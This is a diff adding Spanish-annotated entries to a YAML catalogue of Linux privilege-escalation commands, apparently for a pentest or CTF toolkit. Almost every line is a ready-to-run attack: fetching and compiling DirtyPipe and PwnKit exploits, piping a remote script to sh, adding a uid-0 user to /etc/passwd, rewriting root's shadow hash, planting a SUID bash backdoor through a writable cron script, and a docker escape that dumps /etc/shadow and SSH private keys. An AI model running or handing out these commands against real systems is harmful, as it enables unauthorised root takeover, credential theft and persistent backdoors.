@@ -186,3 +186,59 @@ tools:
     params: []
     tags: [privesc, linux, capabilities, perl, gtfobins]
     notes: "Verificar con: /usr/sbin/getcap -r / 2>/dev/null | grep perl"
+
+  # ─────────────────────────────────────────────
+  # MODERN LINUX PRIVESC (2020-2024)
+  # ─────────────────────────────────────────────
+
+  - id: dirtypipe_cve_2022_0847
+    name: "DirtyPipe CVE-2022-0847 (Kernel 5.8-5.16)"
+    description: "Escalada a root via escritura en archivos de solo lectura (pipe splice)"
+    command: "# Verificar kernel\nuname -r; # Kernel 5.8.0 - 5.16.10 vulnerable\n# Compilar y ejecutar exploit\ngcc -o /tmp/dirtypipe /tmp/dirtypipe.c 2>/dev/null && /tmp/dirtypipe /etc/passwd 2>/dev/null\n# O usar versión que sobreescribe /etc/passwd con user root\ncurl -sL https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/exploit.c -o /tmp/dirtypipe.c && gcc -o /tmp/dirtypipe /tmp/dirtypipe.c && /tmp/dirtypipe"
+    params: []
+    tags: [privesc, linux, dirtypipe, kernel, cve-2022-0847]
+    notes: "Afecta kernel 5.8.0 hasta 5.16.10. Sobreescribe SUID binarios o /etc/passwd. Muy fiable."
+
+  - id: pwnkit_cve_2021_4034
+    name: "PwnKit CVE-2021-4034 (pkexec)"
+    description: "Escalada a root via vulnerabilidad en pkexec (PolicyKit) - todos los sistemas Linux"
+    command: "# Verificar si vulnerable\npkexec --version 2>/dev/null; # Compilar exploit\nmkdir -p /tmp/pwnkit && cd /tmp/pwnkit && curl -sL 'https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c' -o PwnKit.c && gcc -shared -fPIC -nostartfiles -o /tmp/GCONV_PATH=./pwnkit PwnKit.c && ./GCONV_PATH=./pwnkit"
+    params: []
+    tags: [privesc, linux, pwnkit, pkexec, cve-2021-4034]
+    notes: "Afecta virtualmente todos los sistemas Linux desde 2009. Requiere pkexec instalado."
+
+  - id: linpeas_full
+    name: "LinPEAS - Full Linux PrivEsc Audit"
+    description: "Ejecución completa de LinPEAS para detectar vectores de escalada"
+    command: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas_output.txt"
+    params: []
+    tags: [privesc, linux, linpeas, audit, enumeration]
+    notes: "Si no hay internet: transfer el archivo manualmente. Buscar lineas rojas/amarillas. Colores importantes: Rojo = MUY PROBABLE, Amarillo = POSIBLE"
+
+  - id: writable_etc_passwd
+    name: "/etc/passwd Writable - Añadir Root User"
+    description: "Si /etc/passwd es escribible, añadir usuario con uid=0 (root)"
+    command: "ls -la /etc/passwd /etc/shadow 2>/dev/null; [ -w /etc/passwd ] && echo 'WRITABLE!' && HASH=$(openssl passwd -1 'hacked123' 2>/dev/null) && echo \"hacker:${HASH}:0:0:root:/root:/bin/bash\" >> /etc/passwd && su hacker -c 'id; cat /root/root.txt 2>/dev/null' <<< 'hacked123'"
+    params: []
+    tags: [privesc, linux, etc-passwd, writable, critical]
+    notes: "Si /etc/shadow es escribible: openssl passwd -6 password | xargs -I{} sed -i 's/root:.*:/root:{}:/' /etc/shadow"
+
+  - id: cron_script_hijack
+    name: "Cron Script Hijack - Inyección en script de cron"
+    description: "Si un script ejecutado por cron es escribible, inyectar backdoor"
+    command: "# Listar cron jobs\ncat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/root 2>/dev/null; # Buscar scripts escribibles en PATH de cron\nfind /usr/local/bin /usr/bin /opt /scripts 2>/dev/null -type f -perm -002 | head -10; # Inyectar si encontrado\necho 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash && echo CRON_PRIVESC_SUCCESS' >> {script_path}"
+    params:
+      - name: script_path
+        label: "Path del script de cron escribible"
+        placeholder: "/opt/scripts/backup.sh"
+        required: true
+    tags: [privesc, linux, cron, script-hijack, cronjob]
+    notes: "Esperar al siguiente ciclo de cron. Luego: /tmp/bash -p para obtener shell root."
+
+  - id: docker_group_escape
+    name: "Docker Group - Container Escape a Root"
+    description: "Si el usuario pertenece al grupo docker, escapar al host como root"
+    command: "# Verificar grupo\nid; groups | grep docker; # Escape\ndocker run --rm -v /:/mnt -it alpine chroot /mnt sh -c 'id; cat /etc/shadow | head -5; cat /root/root.txt 2>/dev/null; mkdir -p /root/.ssh && cat /home/*/.ssh/id_rsa 2>/dev/null | head -30'"
+    params: []
+    tags: [privesc, linux, docker, container-escape, group-privilege]
+    notes: "Grupo docker = root local efectivo. Alternativa: docker run --privileged → nsenter -t 1 -m -u -i -n -p -- bash"
